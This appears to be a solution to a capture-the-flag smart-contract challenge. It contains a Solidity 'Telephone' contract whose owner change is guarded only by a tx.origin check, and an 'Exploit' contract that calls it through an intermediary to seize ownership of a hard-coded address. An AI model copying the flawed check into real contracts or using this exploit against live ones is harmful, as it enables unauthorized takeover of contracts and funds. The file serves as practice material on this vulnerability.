// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Exploit {
    function exploit() public {
        Telephone target = Telephone(0x331373d4bBe3393B6d1A8890F60c705744D34bfa);
        
        target.changeOwner(address(0xd7D7fCDdbaF5746D0D89525B2aC8C25447c85352));
    }
}
